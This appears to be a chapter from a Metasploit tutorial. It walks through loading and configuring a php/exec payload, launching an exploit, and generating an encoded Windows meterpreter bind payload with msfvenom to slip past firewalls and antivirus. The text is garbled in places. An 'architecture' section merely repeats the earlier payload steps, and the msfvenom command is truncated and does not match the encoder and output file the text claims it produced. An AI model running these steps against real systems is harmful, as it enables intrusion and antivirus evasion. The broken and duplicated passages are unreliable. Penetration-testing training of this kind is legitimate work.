    # Chapter 29


    ## Performing an Attack using Metasploit


    ![](image_rsrc49Z.jpg)


    ## Perform an attack


    After the user finds a penetration test module that can exploit the vulnerability,
    the attack can be carried out. To perform further attacks, users can also load
    the attack payload (`Payload`). Then, configure the attack payload and implement
    the attack. This section will introduce the method of implementing the attack.


    ### Loading the attack payload


    The attack payload is the aforementioned `Payload` module. By loading attack payloads,
    further attacks can be achieved, such as obtaining a Shell and remotely executing
    commands. The method of loading the attack payload will be introduced below.


    The syntax format for loading the attack payload is as follows:


    ```

    set payload

    ```


    In the above syntax, the parameter `payload` name represents the name of the attack
    payload.


    ### Load the attack payload for the webtest


    The penetration test module imported in above is shown. The specific steps are
    as follows:


    1) Start and select the webtest penetration test module. as follows:


    ```

    root@exampleserver:～# msfconsole

    msf5> use exploit/test/webtest

    msf5 exploit(test/webtest)>

    ```


    2) View the payload that can be loaded.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> show payloads

    ```


    As can be seen from the output information, all available payloads of the current
    penetration test module are displayed. The output information shows a total of
    6 columns of information, which respectively indicate # (Payload number), `Name`
    (name), `Disclosure Date` (release date), `Rank` (level), `Check` (support detection)
    and `Description` (description information). For example, load a PHP execution
    command payload, namely `php/exec`.


    3) Load the attack payload.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> set payload php/exec

    payload => php/exec

    ```


    From the output information, we can see that an attack payload named `php/exec`
    is loaded.


    ### Configure attack payload


    After the user loads the attack payload, it also needs to be configured and set
    the parameter options that need to be configured. The following describes how
    to configure the attack payload. The following will take `php/exec` as an example
    to introduce the method of configuring the attack payload.


    1) Use the `show options` command to view the configurable options.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> show options

    ```


    From the output information, you can see that it includes module options, attack
    load options, and available target options. At this point, the user can set these
    options.


    2) Set the option `CMD` of the attack payload. as follows:


    ```

    msf5 exploit(test/webtest)> set CMD dir

    CMD => dir

    ```


    It can be seen from the output information that the `CMD` value of the `Payload`
    option has been set to `dir`. Next, you can attack the target.


    3) Implement an attack.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> exploit

    ```


    ## Setting up the architecture


    Some penetration testing modules may support multiple system architectures. Under
    normal circumstances, penetration testing modules that support multiple system
    architectures are automatically automatic by default. When the user initiates
    an attack, the penetration test module will automatically select the architecture.


    The user can also set the architecture manually. The following will introduce
    the method.


    The specific steps are as follows:


    1) Start and select the webtest penetration test module. as follows:


    ```

    root@exampleserver:～# msfconsole

    msf5> use exploit/test/webtest

    msf5 exploit(test/webtest)>

    ```


    2) View the payload that can be loaded.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> show payloads

    ```


    As can be seen from the output information, all available payloads of the current
    penetration test module are displayed. The output information shows a total of
    6 columns of information, which respectively indicate # (Payload number), `Name`
    (name), `Disclosure Date` (release date), `Rank` (level), `Check` (support detection)
    and `Description` (description information). For example, load a PHP execution
    command payload, namely `php/exec`.


    3) Load the attack payload.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> set payload php/exec

    payload => php/exec

    ```


    From the output information, we can see that an attack payload named `php/exec`
    is loaded.


    ### Configure attack payload


    After the user loads the attack payload, it also needs to be configured and set
    the parameter options that need to be configured. The following describes how
    to configure the attack payload. The following will take `php/exec` as an example
    to introduce the method of configuring the attack payload.


    1) Use the `show options` command to view the configurable options.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> show options

    ```


    From the output information, you can see that it includes module options, attack
    load options, and available target options. At this point, the user can set these
    options.


    2) Set the option `CMD` of the attack payload. as follows:


    ```

    msf5 exploit(test/webtest)> set CMD dir

    CMD => dir

    ```


    It can be seen from the output information that the `CMD` value of the `Payload`
    option has been set to `dir`. Next, you can attack the target.


    3) Implement an attack.


    The execution command is as follows:


    ```

    msf5 exploit(test/webtest)> exploit

    ```


    ### Set encoding


    In order to avoid the appearance of bad characters, or to avoid the interception
    of the firewall or anti-virus software in the target, you can set the code for
    the attack load to generate a new attack payload. Among them, the encoding module
    is mainly used by the `msfvenom` tool. `msfvenom` is an attack load generator
    supporting the MSF framework.


    Among them, the syntax format used to generate the attack payload is as follows:


    ```

    msfvenom [options]<var=val>

    ```


    Use the `x86/shikata_ga_nai` encoding format to generate a new attack payload
    and save it to `msf.exe`.


    Methods as below:


    1) View all supported codes.


    The execution command is as follows:


    ```

    root@exampleserver:～# msfvenom -l encoders

    ```


    2) Create attack payload.


    The execution command is as follows:


    ```

    root@examplserver:～# ./msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.227

    ```


    From the information output above, we can see that an attack payload was successfully
    created using `x86/shikata_ga_nai` encoding. Among them, the attack payload file
    is `msf.exe`.


